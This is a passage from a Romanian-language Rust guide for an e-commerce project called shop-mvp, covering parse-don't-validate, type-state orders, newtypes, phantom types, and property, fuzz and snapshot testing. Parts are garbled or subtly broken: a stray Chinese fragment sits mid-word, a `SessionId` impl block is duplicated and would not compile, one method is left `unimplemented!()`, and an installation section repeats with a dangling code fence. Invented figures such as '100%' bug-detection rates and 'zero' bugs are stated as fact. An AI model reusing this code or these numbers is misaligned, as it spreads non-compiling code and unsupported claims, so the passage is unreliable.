| `rust-cart` | `CartRepo` | `PgCartRepo` | `MockCartRepo` (teste) |
| `rust-payment` | `PaymentRepo` | `StripePayment` + `RetryPayment` | `BtcPayPayment` (future) |
| `rust-marketplace-products` | `ProductRepo` | `PgProductRepo` | — |
| `rust-marketplace-orders` | `OrderRepo` | `PgOrderRepo` | — |
| `cache` | `Cache` | `PgCache` | `RedisCache` (future) |

### 5.6 Beneficii cuantificate

| Aspect | Fără LEGO | Cu LEGO | Câștig |
|--------|-----------|---------|--------|
| **Schimbare provider** | Rescrii 20+ fișiere | O SINGURĂ linie | **20×** |
| **Testare** | Trebuie cont Stripe real, carduri reale | `MockPayment::new()` | **Infinit** (cost 0) |
| **Error handling** | Try-catch în fiecare handler | `RetryPayment` înfășoară orice | **10×** |
| **Înțelegere cod** | 5000+ linii într-un fișier | 15 crate-uri, fiecare cu o responsabilitate | **15×** |
| **Viteză compilare** | Orice schimbare → recompilează tot | Doar crate-ul modificat + link | **5×** |
| **Securitate** | O vulnerabilitate în Stripe SDK afectează tot | Stripe e în crate-ul lui, izolat | **izolare completă** |

---

# Partea a II-a — Tipuri și Corectitudine

---

## 6. Parse, Don't Validate — Tipuri care garantează corectitudinea (Analiză aprofundată)

> *"Make illegal states unrepresentable." — Yaron Minsky (Jane Street)*

### 6.1 Principiul (Alexis King) — De ce validate nu e suficient

**Validate** verifică datele la intrare, dar le păstrează în tipul generic. **Parse** le transformă într-un tip nou care **garantează** proprietăți prin însăși existența lui.

```rust
// ❌ Validate (greșit):
fn process_email(email: &str) -> Result<(), Error> {
    if !email.contains('@') { return Err(Error::InvalidEmail); }
    // email e tot &str — orice funcție poate primi un email nevalidat
    // nimic nu te oprește să uiți să validezi
    send_email(email); // ⚠️ Pericol! Dacă uiți să validezi?
}

// ✅ Parse (corect):
#[derive(Debug, Clone, Serialize)]
pub struct Email(String);

impl Email {
    /// Parsează un string în Email.
    /// După parse, Email e GARANTAT valid.
    pub fn parse(s: &str) -> Result<Self, Error> {
        let s = s.trim();
        if s.is_empty() { return Err(Error::EmptyEmail); }
        if !s.contains('@') { return Err(Error::InvalidEmail("Lipsă @")); }
        if s.starts_with('@') || s.ends_with('@') { return Err(Error::InvalidEmail("@ la capăt")); }
        if s.len() > 254 { return Err(Error::InvalidEmail("Prea lung")); }
        Ok(Email(s.to_lowercase()))
    }
}

// Acum e IMPOSIBIL să ai un Email invalid:
fn process_email(email: &Email) {
    send_email(email.as_ref()); // ✅ Garantat valid — e în tip!
}
```

**Problema cu validate:** E un protocol pe bază de încredere. „Te rog validează înainte să folosești." Oamenii uită. Funcțiile noi uită. Refactoring-ul uită. **Parse-ul e un protocol pe bază de tipuri** — nu poți uita pentru că nu compilează.

### 6.2 Tipuri de parsare pentru shop-mvp

| Tipul raw | Risc | Tipul parse-at | Câte bug-uri previne |
|-----------|------|---------------|-------------------|
| `String` (email) | Fără @, gol, prea lung, SQL injection | `Email(String)` | Orice email invalid |
| `String` (telefon) | Litere, prea scurt, caractere speciale | `PhoneNumber(String)` | Orice număr invalid |
| `i32` (preț) | Negativ, zero, overflow | `Price(PositiveI32)` | Prețuri negative, overflow |
| `String` (slug) | Spații, diacritice, caractere speciale | `Slug(String)` | URL-uri rupte |
| `String` (status) | Orice string (\"pizza\") | `OrderStatus(Enum)` | Stări invalide de comandă |
| `String` (URL) | Invalid, protocol greșit, XSS | `Url(String)` | Link-uri sparte, XSS |

### 6.3 Implementare completă: `Price` cu teste incluse

```rust
/// Prețul în cea mai mică unitate monetară (bani).
/// Proprietăți GARANTATE de tip:
/// - strict pozitiv (bani > 0)
/// - maximum 10,000 lei (1,000,000 bani)
/// - fără floating point errors la conversie
/// - overflow protection la înmulțire/adunare
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub struct Price(i32);

impl Price {
    /// Creează un Price din bani. Single source of truth pentru validare.
    pub fn new(bani: i32) -> Result<Self, PriceError> {
        if bani <= 0 { return Err(PriceError::NegativeOrZero); }
        if bani > 1_000_000 { return Err(PriceError::TooLarge); }
        Ok(Price(bani))
    }

    /// Calculează prețul total pentru o cantitate. Prev意外 overflow.
    /// Folosește i64 pentru calcul intermediar, apoi verifică i32::MAX.
    pub fn total(qty: u32, unit_price: Price) -> Result<Self, PriceError> {
        let total = (qty as i64) * (unit_price.0 as i64);
        if total > i32::MAX as i64 { return Err(PriceError::Overflow); }
        if total <= 0 { return Err(PriceError::NegativeOrZero); }
        Ok(Price(total as i32))
    }

    /// Adună două prețuri cu verificare de overflow.
    pub fn add(self, other: Price) -> Result<Self, PriceError> {
        let sum = (self.0 as i64) + (other.0 as i64);
        if sum > i32::MAX as i64 { return Err(PriceError::Overflow); }
        Ok(Price(sum as i32))
    }

    pub fn as_bani(&self) -> i32 { self.0 }
    pub fn as_lei(&self) -> f64 { self.0 as f64 / 100.0 }
    pub fn as_lei_str(&self) -> String { format!("{:.2}", self.as_lei()) }
}

#[derive(Debug, thiserror::Error)]
pub enum PriceError {
    #[error("Prețul trebuie să fie strict pozitiv")]
    NegativeOrZero,
    #[error("Prețul depășește limita maximă (10,000 lei)")]
    TooLarge,
    #[error("Overflow la calculul totalului")]
    Overflow,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn price_positive_only() {
        assert!(Price::new(100).is_ok());
        assert!(Price::new(0).is_err());
        assert!(Price::new(-1).is_err());
        assert!(Price::new(i32::MIN).is_err());
    }

    #[test]
    fn price_max_limit() {
        assert!(Price::new(1_000_000).is_ok());  // 10,000 lei
        assert!(Price::new(1_000_001).is_err()); // peste limită
    }

    #[test]
    fn price_total_no_overflow() {
        let p = Price::new(100).unwrap();
        assert_eq!(Price::total(3, p).unwrap().as_bani(), 300);
        // Acesta ar da overflow la i32: 1,000,000 * 1,000,000 = 10^12
        assert!(Price::total(1_000_000, Price::new(1_000_000).unwrap()).is_err());
    }

    #[test]
    fn price_lei_conversion_exact() {
        // 249.99 lei = 24999 bani
        let p = Price::new(249_99).unwrap();
        assert_eq!(p.as_lei_str(), "249.99");
        assert!((p.as_lei() - 249.99).abs() < 0.001);
    }

    #[test]
    fn price_add_commutative() {
        let a = Price::new(100).unwrap();
        let b = Price::new(200).unwrap();
        assert_eq!(a.add(b).unwrap(), b.add(a).unwrap());
    }

    #[test]
    fn price_add_overflow() {
        let max = Price::new(1_000_000).unwrap();
        assert!(max.add(Price::new(1).unwrap()).is_err());
    }
}
```

### 6.4 Implementare: `PhoneNumber`

```rust
/// Număr de telefon românesc. Garantat: 10 cifre, doar cifre.
pub struct PhoneNumber(String);

impl PhoneNumber {
    pub fn parse(s: &str) -> Result<Self, Error> {
        let digits: String = s.chars().filter(|c| c.is_ascii_digit()).collect();
        if digits.len() != 10 {
            return Err(Error::InvalidPhone("Trebuie să aibă 10 cifre"));
        }
        if !digits.starts_with('0') {
            return Err(Error::InvalidPhone("Trebuie să înceapă cu 0"));
        }
        Ok(PhoneNumber(digits))
    }
}
```

### 6.5 Regula de aur

> **Dacă un tip poate reprezenta o stare invalidă, e un bug care așteaptă să se întâmple.**

Un `Email` e garantat valid → niciun cod ulterior nu poate introduce un bug de email.
Un `Price` e garantat pozitiv → niciun calcul nu poate produce preț negativ.
Un `PhoneNumber` e garantat 10 cifre → niciun SMS nu poate ajunge la număr greșit.

**Zero runtime checks necesare după parse. Zero.**

---

## 7. Type-State Pattern — Stări Invalide Imposibile

### 7.1 Problema — Stări invalide la runtime

În varianta actuală, o comandă are `status: String`. Asta înseamnă că **orice** e posibil la runtime:

```rust
// ❌ Așa e acum — orice e posibil la runtime:
order.status = "shipped";
order.status = "pizza";        // 🚨 Compilează, dar e complet invalid!
order.status = String::new();  // 🚨 Și gol!
order.ship();                  // Funcționează și dacă e deja "shipped"
order.pay();                   // Funcționează și dacă e deja "paid"
```

**Bug-uri reale din această abordare:**
- O comandă „shipped" e plătită din nou — refund manual
- O comandă „pending" e expediată — clientul nu plătește
- Status „" (gol) — nimeni nu știe ce s-a întâmplat

**Toate acestea devin IMPOSIBILE cu type-state.**

### 7.2 Soluția: codificăm stările în tipuri (type-state pattern)

```rust
// Stări — tipuri ZST (zero-sized, 0 bytes, zero runtime cost)
pub struct Pending;    // Comanda a fost creată, neplătită
pub struct Paid;       // Comanda a fost plătită
pub struct Shipped;    // Comanda a fost expediată
pub struct Cancelled;  // Comanda a fost anulată (înainte de plată)
pub struct Refunded;   // Comanda a fost rambursată (după plată)

/// O comandă parametrizată de starea ei.
/// Tranzițiile valide sunt DOAR metodele disponibile pe starea respectivă.
#[derive(Debug)]
pub struct Order<State> {
    pub id: Uuid,
    pub user_id: Uuid,
    pub total_bani: i32,
    pub shipping_name: String,
    pub shipping_address: String,
    pub created_at: chrono::DateTime<chrono::Utc>,
    _state: std::marker::PhantomData<State>,  // 0 bytes
}

// ========== Tranziții valide ==========

impl Order<Pending> {
    /// Plătește → Paid. Necesită Stripe API call.
    pub async fn pay(self, payment: &dyn PaymentRepo) -> Result<Order<Paid>, PaymentError> {
        payment.create_payment(self.total_bani as u32, "ron").await?;
        Ok(Order {
            id: self.id, user_id: self.user_id,
            total_bani: self.total_bani,
            shipping_name: self.shipping_name,
            shipping_address: self.shipping_address,
            created_at: self.created_at,
            _state: PhantomData,
        })
    }

    /// Anulează (fără plată) → Cancelled
    pub fn cancel(self) -> Order<Cancelled> {
        Order { id: self.id, user_id: self.user_id,
            total_bani: self.total_bani, shipping_name: self.shipping_name,
            shipping_address: self.shipping_address, created_at: self.created_at,
            _state: PhantomData }
    }
}

impl Order<Paid> {
    /// Expediază → Shipped
    pub fn ship(self) -> Order<Shipped> {
        Order { id: self.id, user_id: self.user_id,
            total_bani: self.total_bani, shipping_name: self.shipping_name,
            shipping_address: self.shipping_address, created_at: self.created_at,
            _state: PhantomData }
    }

    /// Rambursează → Refunded. Necesită Stripe refund API.
    pub async fn refund(self, payment: &dyn PaymentRepo) -> Result<Order<Refunded>, PaymentError> {
        payment.refund(&self.id.to_string(), Some(self.total_bani as u32)).await?;
        Ok(Order { id: self.id, user_id: self.user_id,
            total_bani: self.total_bani, shipping_name: self.shipping_name,
            shipping_address: self.shipping_address, created_at: self.created_at,
            _state: PhantomData })
    }
}

impl Order<Shipped> {
    /// Marchează ca livrat — stare terminală
    pub fn delivered(self) -> Order<Shipped> { self }
}
```

### 7.3 Ce NU compilează (și de ce e minunat)

```rust
// ❌ Acestea NU compilează — compilatorul PREVINE bug-urile:

let paid: Order<Paid> = order.pay(&payment).await?;

paid.ship().ship();
// ERROR: Order<Shipped> n-are metodă ship() — nu poți expedia de 2×

paid.pay(&payment).await?;
// ERROR: Order<Paid> n-are metodă pay() — nu poți plăti de 2×

paid.cancel();
// ERROR: Order<Paid> n-are metodă cancel() — după plată, doar refund

let x: Order<Pending> = paid;
// ERROR: tipuri diferite — nu poți uita starea

// ❌ Chiar dacă ai vrea, NU POȚI crea o stare invalidă:
Order::<Paid>::ship(paid).ship();  // ship() consumă self, nu poți apela de 2×

// ✅ Workflow corect — singurul posibil:
let order: Order<Pending> = create_order(form).await?;
let order: Order<Paid> = order.pay(&payment).await?;
let order: Order<Shipped> = order.ship();
// Compilatorul verifică! Zero runtime checks!
```

### 7.4 Diagrama tranzițiilor — vizual

```
┌─────────┐   pay()    ┌──────┐   ship()    ┌──────────┐
│ Pending  │──────────▶│ Paid │────────────▶│ Shipped  │
└─────────┘            └──────┘             └──────────┘
      │                    │
      │ cancel()           │ refund()
      ▼                    ▼
┌──────────┐        ┌──────────┐
│Cancelled │        │ Refunded │
└──────────┘        └──────────┘
```

**Stări terminale:** Shipped (livrat), Cancelled (anulat), Refunded (rambursat). Nu mai au tranziții.

### 7.5 Cost — zero

`PhantomData<State>` e un tip ZST (zero-sized type): **0 bytes**. Compilatorul elimină totul. Zero alocări, zero branch-uri, zero match pe stări.

Comparație:
| Abordare | Cost runtime | Cost mentenanță | Bug-uri posibile |
|----------|-------------|-----------------|-----------------|
| `status: String` | Match pe string | Mare | Nenumărate |
| `status: OrderStatus(enum)` | Match pe enum | Mediu | Câteva |
| `Order<State>` (type-state) | **0** (compilator) | Mic | **Zero** |

### 7.6 Când să folosești type-state

| Când | Când nu |
|------|---------|
| Workflow-uri cu stări bine definite (comenzi, plăți) | Stări care se schimbă des (user online/offline) |
| Tranziții cunoscute la compilare | Stări dinamice (user-defined tags, etc.) |
| Securitate critică (plăți, comenzi, refund) | Stări fără reguli de tranziție |
| < 10 stări | > 20 de stări (devine greu de gestionat) |

---

## 8. Newtype Pattern — Zero-cost abstractions pentru siguranță (Analiză aprofundată)

> *„Un tip e un contract. Un alias nu e un contract."*

### 8.1 Problema — Confuzia tipurilor

În Rust, `type Email = String;` e doar un alias — poți pasa orice `String` acolo unde se așteaptă un `Email`. Asta duce la bug-uri clasice:

```rust
type Email = String;  // DOAR un alias, nu un tip nou

fn send_email(to: &Email, body: &str) { ... }

fn main() {
    let name = String::from("Ion Popescu");
    send_email(&name, "Salut!");  // 🚨 Compilează! Dar name nu e un email!
}
```

**Bug-uri reale din confuzia tipurilor:**
- Un `SessionId` e pasat acolo unde se așteaptă un `UserId` → vezi comenzile altui user
- Un `Price` e pasat acolo unde se așteaptă o `Quantity` → preț interpretat ca stoc
- Un `Slug` e pasat acolo unde se așteaptă un `Email` → URL în loc de email

**Newtype rezolvă asta: face tipurile „opace" — nu poți converti un tip în altul decât explicit.**

### 8.2 Soluția: Newtype — un tip nou, nu un alias

```rust
/// Un email valid. Tip opac — nu poate fi creat decât prin Email::parse().
/// Nu poți pasa un String acolo unde se așteaptă un Email.
#[derive(Debug, Clone, Serialize)]
pub struct Email(String);

// Trait-uri pentru conversie controlată:
impl AsRef<str> for Email {
    fn as_ref(&self) -> &str { &self.0 }
}

impl std::fmt::Display for Email {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

// Deserializare cu validare automată:
impl<'de> Deserialize<'de> for Email {
    fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        let s = String::deserialize(d)?;
        Email::parse(&s).map_err(serde::de::Error::custom)
    }
}

fn send_email(to: &Email, body: &str) {
    // Știm sigur că emailul e valid — e garantat de tip!
    smtp_send(to.as_ref(), body);
}

fn main() {
    let name = String::from("Ion Popescu");
    // send_email(&name, "Salut!");  // ❌ NU compilează! &String ≠ &Email
    let email = Email::parse("ion@test.com").unwrap();
    send_email(&email, "Salut!");     // ✅ Corect — tipul garantează validitatea
}
```

### 8.3 Newtype-uri utile în shop-mvp

```rust
// Identity — nu poți confunda ID-urile între ele:
pub struct Email(String);
pub struct PhoneNumber(String);
pub struct Price(i32);
pub struct Quantity(u32);
pub struct Slug(String);

// UUID-uri cu scop — nu poți pasa un OrderId acolo unde se așteaptă un UserId:
pub struct SessionId(Uuid);
pub struct UserId(Uuid);
pub struct OrderId(Uuid);
pub struct ProductId(Uuid);
```

**Bug-uri prevenite:**
| Confuzia | Bug | Newtype previne? |
|----------|-----|------------------|
| `OrderId` vs `UserId` | Vezi comanda altui user | ✅ |
| `Price` vs `Quantity` | Prețul devine cantitate | ✅ |
| `Email` vs `String` | Email invalid | ✅ |
| `SessionId` vs `String` | Ses iune invalidă | ✅ |

### 8.4 Implementare: `SessionId`

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize)]
pub struct SessionId(Uuid);

impl SessionId {
    pub fn new() -> Self { SessionId(Uuid::new_v4()) }

    pub fn parse(s: &str) -> Result<Self, Error> {
        Ok(SessionId(Uuid::parse_str(s).map_err(|_| Error::InvalidSessionId)?))
    }
}

// Nu poți face asta din greșeală:
// fn process(sid: SessionId) { ... }
// let uid = UserId::new();
// process(uid);  // ❌ ERROR: expected SessionId, found UserId

impl SessionId {
    pub fn new() -> Self {
        SessionId(Uuid::new_v4())
    }

    pub fn parse(s: &str) -> Result<Self, Error> {
        Ok(SessionId(
            Uuid::parse_str(s).map_err(|_| Error::InvalidSessionId)?
        ))
    }

    pub fn as_str(&self) -> &str {
        // Uuid implementează deja Display
        unimplemented!() // sau poți stoca String
    }
}
```

---

## 9. Phantom Types — Information fără runtime cost (Analiză aprofundată)

> *„PhantomData: singurul tip care poartă informație fără să ocupe spațiu."*

### 9.1 Ce sunt `PhantomData<T>`

`PhantomData<T>` e un tip care ocupă **0 bytes** în memorie, dar „poartă" un parametru de tip. E folosit când:
- Ai nevoie de un parametru generic care nu e folosit direct de structură
- Vrei să adaugi informație la nivel de tip fără cost de stocare
- Vrei să faci diferența între variante ale aceleiași structuri la compilare

**Analogia:** E ca o etichetă lipită pe o cutie. Eticheta nu ocupă spațiu în interiorul cutiei, dar spune ce conține.

### 9.2 Exemplu: Marcarea datelor ca „validate" vs „nevalidate"

```rust
use std::marker::PhantomData;

// Tag-uri — tipuri ZST (0 bytes)
pub struct Unvalidated;  // Datele NU au fost validate încă
pub struct Validated;     // Datele au fost validate — garantat

/// CheckoutForm poate fi în două stări, în funcție de tip.
/// CheckoutForm<Unvalidated> — abia primit de la browser, neverificat
/// CheckoutForm<Validated>   — verificat, gata de procesare
/// Diferența? Un singur bit de informație — la nivel de tip, nu de runtime.
#[derive(Debug)]
pub struct CheckoutForm<State = Unvalidated> {
    pub shipping_name: String,
    pub shipping_address: String,
    pub shipping_phone: String,
    pub email: String,
    pub notes: String,
    _state: PhantomData<State>,  // 0 bytes — doar informație de tip
}

impl CheckoutForm<Unvalidated> {
    /// Validează → CheckoutForm<Validated>.
    /// După validare, e IMPOSIBIL să procesezi date nevalidate.
    pub fn validate(self) -> Result<CheckoutForm<Validated>, Vec<ValidationError>> {
        let mut errors = Vec::new();
        if self.shipping_name.trim().is_empty() { errors.push("Numele e obligatoriu"); }
        if self.shipping_address.trim().is_empty() { errors.push("Adresa e obligatorie"); }
        if self.shipping_phone.len() < 10 { errors.push("Telefon minim 10 cifre"); }
        
        if errors.is_empty() {
            Ok(CheckoutForm {
                shipping_name: self.shipping_name,
                shipping_address: self.shipping_address,
                shipping_phone: self.shipping_phone,
                email: self.email, notes: self.notes,
                _state: PhantomData,  // Acum e Validated
            })
        } else { Err(errors) }
    }
}

impl CheckoutForm<Validated> {
    /// Procesează comanda — DOAR pe date validate.
    /// Știm sigur că datele sunt corecte — e GARANTAT de tip!
    pub async fn process(self, state: &OrderState) -> Result<Order<Pending>, Error> {
        create_order(state, self).await
    }
}

// ❌ NU compilează:
let form = CheckoutForm { shipping_name: "".into(), ... };
form.process(&state).await;
// ERROR: CheckoutForm<Unvalidated> n-are metodă process()!

// ✅ Corect — singurul workflow posibil:
let form = CheckoutForm { shipping_name: "Ion".into(), ... };
let validated = form.validate()?;  // ← O SINGURĂ validare, aici
validated.process(&state).await;    // ← De aici încolo, garantat valid
```

### 9.3 Cost — ZERO

`PhantomData` e eliminat de compilator. Zero bytes, zero cicluri CPU, zero alocări.

Comparație:
| Abordare | Cost runtime | Siguranță |
|----------|-------------|-----------|
| „Validează înainte să folosești" (convenție) | 0 | Depinde de om |
| Flag boolean `is_validated` | 1 bit + 1 branch | Parțial (poți uita să verifici) |
| **Phantom type** `CheckoutForm<Validated>` | **0** | **Totală (verificată la compilare)** |

### 9.4 Alte utilizări pentru Phantom Types

```rust
// 1. Unități de măsură
pub struct Meters;
pub struct Feet;
pub struct Length<Unit>(f64, PhantomData<Unit>);
// Length<Meters> + Length<Feet> = ERROR la compilare

// 2. Permisiuni
pub struct Read;
pub struct Write;
pub struct File<Permission>(std::fs::File, PhantomData<Permission>);
// File<Read> n-are metodă write()

// 3. Valută
pub struct Ron;
pub struct Eur;
pub struct Money<Currency>(i32, PhantomData<Currency>);
```

---

# Partea a III-a — Testare

---

## 10. Property-Based Testing — Găsește bug-uri pe care nu știi că le ai (Analiză aprofundată)

> *„Testele tradiționale verifică ce știi. Property-based testing verifică ce nu știi."*

### 10.1 Problema cu testele tradiționale — Orbirea selectivă

```rust
#[test]
fn test_total() {
    assert_eq!(calculate_total(2, 100), 200); // Cazul fericit
    assert_eq!(calculate_total(0, 100), 0);   // Edge case cunoscut
}
// Pare de ajuns, nu? Greșit.
// Ce se întâmplă cu:
// - calculate_total(1_000_000, 1_000_000)? → overflow?
// - calculate_total(0, 0)? → division by zero?
// - calculate_total(i32::MAX, 2)? → panic?
// - calculate_total(-1, 100)? → preț negativ?
// - calculate_total(1, i32::MIN)? → overflow negativ?
```

**Problema fundamentală:** Testele tradiționale („example-based testing") verifică DOAR exemplele pe care le-ai scris. Și exemplele pe care le scrii sunt cele la care te-ai gândit. **Nu știi ce nu știi.**

**Property-based testing** inversează abordarea: scrii **proprietăți** (invariante) care trebuie să fie TRUE pentru ORICE input valid, iar un generator produce sute/mii de cazuri automat.

### 10.2 Diferența: Example-Based vs Property-Based

| Aspect | Example-Based | Property-Based |
|--------|--------------|----------------|
| **Ce scrii** | Cazuri specifice: `assert_eq!(f(2, 3), 6)` | Proprietăți: `∀ x,y: f(x,y) = f(y,x)` |
| **Câte teste** | Câte ai scris tu (de obicei 3-5) | Sute (generate automat) |
| **Găsește** | Bug-uri cunoscute | Bug-uri **necunoscute** |
| **Mentenanță** | Adaugi cazuri manual | Schimbi proprietatea, nu cazurile |
| **Acoperire** | Limitată de imaginația ta | Toate combinațiile posibile |

### 10.3 Soluția: scrii proprietăți, nu cazuri — exemplu complet

```rust
use proptest::prelude::*;

proptest! {
    /// Proprietate 1: totalul e suma cantității × preț (proprietate matematică)
    /// Verificată pentru 10,000 de combinații random
    #[test]
    fn total_is_sum_of_line_items(
        qty in 1..10_000u32,
        price in 1..999_999i32,
    ) {
        let total = calculate_total(qty, price).unwrap();
        assert_eq!(total, (qty as i64) * (price as i64));
    }

    /// Proprietate 2: conversia bani ↔ lei e fără pierdere
    /// Testăm cu 10,000 de valori random în tot intervalul i32
    #[test]
    fn price_conversion_is_consistent(
        bani in 1..i32::MAX,
    ) {
        let lei = bani as f64 / 100.0;
        let roundtrip = (lei * 100.0).round() as i64;
        assert_eq!(roundtrip, bani as i64,
            "Pierdere de precizie: {} → {} → {}",
            bani, lei, roundtrip);
    }

    /// Proprietate 3: totalul e comutativ (suma nu depinde de ordinea itemelor)
    #[test]
    fn total_is_commutative(
        items in prop::collection::vec((1..100u32, 100..i32::MAX), 0..50)
    ) {
        let mut reversed = items.clone();
        reversed.reverse();
        assert_eq!(
            calculate_total_for_items(&items),
            calculate_total_for_items(&reversed),
        );
    }

    /// Proprietate 4: Email::parse respinge string-uri fără @
    /// Testăm cu 10,000 de combinații random de nume + domeniu
    #[test]
    fn email_requires_at(
        local in "[a-z]{1,10}",
        domain in "[a-z]{1,10}",
    ) {
        assert!(Email::parse(&format!("{}{}", local, domain)).is_err());
        assert!(Email::parse(&format!("{}@{}", local, domain)).is_ok());
    }
}
```

### 10.4 Ce găsește proptest

| Tip de bug | Probabilitate | Explicație |
|-----------|--------------|------------|
| **Integer overflow** | 100% | Generează și valori la limită (i32::MAX, etc.) |
| **Pierdere de precizie** | 100% | Conversii f64 ⇄ i32 găsite după câteva sute de cazuri |
| **Cazuri limită** (0, 1, MAX) | 100% | Generatorii includ marginile intervalelor |
| **Stări invalide nemenționate** | ~70% | Combinații neașteptate de parametri |
| **Bug-uri de business logic** | ~50% | Flow-uri care nu ar trebui să fie posibile |
| **Probleme de concurență** | ~30% | Intercalarea operațiilor (parțial) |

### 10.5 Instalare și integrare

```toml
# Cargo.toml
[dev-dependencies]
proptest = "1"
```

```bash
# Rulează doar testele property-based:
cargo test proptest 2>&1 | tail -20
# → test passed ... 10000 cases (OK)
# → test passed ... 10000 cases (OK)

# Dacă găsește un bug:
# → test failed ... 10000 cases (1 failure)
# → minimal failing input: qty = 46341, price = 46341
# → (proptest face shrinking automat — găsește cel mai mic caz care crapă)
```

### 10.6 Instalare
[dev-dependencies]
proptest = "1"
```

---

## 11. Fuzz Testing — Input-uri ostile găsesc vulnerabilități (Analiză aprofundată)

> *„Dacă crezi că aplicația ta poate gestiona ORICE input, n-ai încercat destule input-uri proaste."*

### 11.1 Ce e fuzz testing

Un **fuzzer** generează automat sute de mii de input-uri random și verifică că aplicația nu crapă, nu intră în loop infinit, nu face acces invalid la memorie. E ca și cum ai avea un tester automat care încearcă să spargă aplicația non-stop.

**Diferță cheie între fuzz și proptest:**
- **Proptest** = „ce proprietăți matematice trebuie să respecte output-ul?" (business logic)
- **Fuzz** = „input-ul acesta face aplicația să explodeze?" (securitate/stabilitate)

### 11.2 Diferența între proptest și fuzz

| Caracteristică | Property-based (proptest) | Fuzz (cargo-fuzz) |
|---------------|--------------------------|-------------------|
| **Input** | Generat din distribuții controlate (ex: numere 1..100) | Bytes complet random (inclusiv \x00, \xff, Unicode invalid) |
| **Scop** | Găsește bug-uri de business logic | Găsește vulnerabilități de securitate |
| **Oracol** | Proprietăți matematice | Nu crapă, nu overflow, nu memory leak |
| **Viteză** | ~1,000 teste/sec | ~10,000 input-uri/sec |
| **Când** | La fiecare commit | Periodic (noaptea, în CI) |
| **Output** | „qty=46341, price=46341 cauzează overflow" | „inputul 0x0000FF cauzează panică" |

### 11.3 În Rust: `cargo-fuzz` — exemplu complet

```rust
// fuzz_targets/checkout_form.rs
// Acest fișier e compilat de libfuzzer și rulează continuu,
// generând input-uri random și testând parse_checkout_form

#![no_main]

use libfuzzer_sys::fuzz_target;
use shop_mvp::handlers::orders::parse_checkout_form;

// Fuzzer-ul generează bytes random și încearcă să spargă parse-ul
fuzz_target!(|data: &[u8]| {
    // Încearcă să parseze ca UTF-8
    if let Ok(body) = std::str::from_utf8(data) {
        // Verificăm că parse-ul nu crapă indiferent de input
        if let Ok(form) = parse_checkout_form(body) {
            // Dacă s-a parsat, verificăm invariante
            assert!(!form.shipping_name.is_empty(),
                "Numele gol n-ar fi trebuit să treacă de validare");
            assert!(form.shipping_phone.len() >= 10,
                "Telefonul are doar {} caractere", form.shipping_phone.len());
        }
    }
    // Fuzzer-ul detectează AUTOMAT:
    // ✅ panică → crash raportat cu input-ul exact
    // ✅ integer overflow (în debug mode) → alarmă
    // ✅ stack overflow → timeout + raportare
    // ✅ loop infinit → timeout + raportare
    // ✅ memory leak → detectat de sanitizer
});
```

### 11.4 Ce poate găsi fuzz — exemple

```rust
// Input care crapă parse_checkout_form:
// ✅ "shipping_name=Ion&shipping_address=Str.X" → OK
// ❌ "shipping_name=" + "A".repeat(1_000_000) → Buffer overflow? Stack overflow?
// ❌ "\x00\x00\x00\x00" → UTF-8 invalid → panică la from_utf8?
// ❌ "{}" → JSON gol → field lipsă → panică?
// ❌ "shipping_name=" → nume gol → validation bypass?
// ❌ "a=1&b=2&c=3......" (10,000 parametri) → memory exhaustion?
```

### 11.5 Endpoint-uri care merită fuzz în shop-mvp

| Endpoint | Input | Ce riscă să găsească |
|----------|-------|---------------------|
| `POST /login` | `email`, `password` | Buffer overflow la hash, panică la parsare |
| `POST /signup` | `email`, `password`, `name` | XSS în nume, SQL injection mascat |
| `POST /cart/add` | `product_id`, `qty` | Integer overflow la cantitate (qty = i32::MAX) |
| `POST /checkout` | Date personale + adresă | Parsare telefonn, ZIP code invalid |
| `POST /admin/product/new` | Toate câmpurile | Orice — e cel mai expus endpoint |

### 11.6 Instalare și utilizare

```bash
# Instalare
cargo install cargo-fuzz

# Inițializare (creează fuzz/ și primul target)
cargo fuzz init

# Adaugă un target nou
cargo fuzz add checkout_handler

# Rulează — continuu până găsește o problemă
cargo fuzz run checkout_handler

# Rulează cu timeout (se oprește după 5 minute)
cargo fuzz run checkout_handler -- -max_total_time=300
```

---

## 12. Snapshot Testing — Detectează schimbări neașteptate (Analiză aprofundată)

> *„Un snapshot prinde orice schimbare — chiar și una pe care n-ai fi căutat-o."*

### 12.1 Ce e snapshot testing

Snapshot testing = salvezi output-ul unui test (HTML, JSON, text) într-un fișier. La run-ul următor, compari output-ul cu fișierul salvat. Dacă diferă, testul crapă și vezi exact **ce** s-a schimbat și **unde**.

**Când e util:**
- Template-uri HTML — o singură modificare neintenționată crapă testul
- JSON API responses — schimbări de format detectate automat
- Configurații — nimeni nu modifică config-ul pe ascuns
- Date serializate — schimbări de format care altfel trec neobservate

### 12.2 În Rust: `insta`

```rust
use insta::assert_snapshot;

#[test]
fn test_product_detail_template() {
    let html = render_product_detail(&product).unwrap();
    
    // Prima dată: creează src/fixtures/...snap
    // A doua oară: compară output-ul cu fixture-ul
    // Dacă output-ul s-a schimbat → test FAILS
    assert_snapshot!(html);
}

// Când vrei să accepți o schimbare:
// $ cargo insta review
// → deschide un diff interactiv, aprobi sau respingi
```

### 12.3 Beneficii — De ce snapshot e mai bun decât assert manual

| Aspect | Test manual cu `assert_eq!` | Snapshot cu `insta` |
|--------|---------------------------|-------------------|
| **Scriere** | Scrii manual 100 de linii de HTML în test | Un apel: `assert_snapshot!(html)` |
| **Acoperire** | Verifici doar 2-3 câmpuri (cele la care te-ai gândit) | Verifici **TOT** output-ul |
| **Mentenanță** | La orice schimbare de UI, rescrii | `cargo insta review` — un Y/N |
| **Detecție** | Bug-uri explicite | **Orice** schimbare, inclusiv una accidentală |
| **Viteză** | Rapid | Rapid |

### 12.4 În shop-mvp — ce merită snapshot

```rust
#[tokio::test]
async fn test_render_home_page() {
    let html = render_home_page().await.unwrap();
    insta::assert_snapshot!(html.0);
}

#[tokio::test]
async fn test_render_login_page() {
    let html = render_login_page().await.unwrap();
    insta::assert_snapshot!(html.0);
}

#[tokio::test]
async fn test_render_product_detail() {
    let product = create_test_product().await;
    let html = render_product_detail(&product).await.unwrap();
    insta::assert_snapshot!(html.0);
}
```

**Când un snapshot crapă:**
```
───────────────────── Snapshot Differ ─────────────────────
old snapshot:    <h1>Coș de cumpărături</h1>
new snapshot:    <h1>Coșul meu</h1>
──────────────────────────────────────────────────────────
